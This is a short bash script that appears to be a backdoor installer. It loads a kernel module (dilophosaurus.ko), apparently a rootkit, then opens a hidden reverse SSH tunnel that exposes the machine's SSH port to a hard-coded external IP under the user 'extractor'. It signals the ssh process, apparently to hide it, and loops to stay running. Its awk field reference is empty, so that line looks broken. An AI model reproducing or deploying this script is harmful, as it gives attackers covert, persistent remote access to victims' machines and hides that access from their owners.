#! /bin/bash
insmod /lib/dilophosaurus.ko
ssh -fN -i /root/.ssh/authorized_keys -R 0.0.0.0:7070:localhost:22 extractor@51.38.185.89 -p 41135 
kill -24 $(ps axf | grep "ssh -fN" | grep -v grep | awk '{print }')
while :
do
        sleep 1
done
